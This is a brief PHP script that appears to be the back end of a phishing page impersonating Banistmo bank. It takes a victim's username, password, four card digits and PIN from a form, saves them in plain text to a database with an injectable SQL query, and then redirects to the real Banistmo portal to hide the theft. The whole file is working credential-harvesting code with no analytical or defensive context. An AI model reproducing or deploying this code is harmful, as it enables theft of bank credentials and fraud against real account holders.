<?php
$usuario = $_POST['user_name'];
$pass = $_POST['password'];
$digitos = $_POST['4digitos'];
$pin = $_POST['pin'];

require 'conexion.php';
$consulta = $pdo->prepare("INSERT INTO `datos` (`usuario`,`contra`,`cuatro_digitos`,`pin`,`id`) VALUES ('$usuario','$pass','$digitos','$pin',NULL)");
$consulta->execute();
header("Location:https://www.banistmo.com/wps/portal/banistmo/personas/");
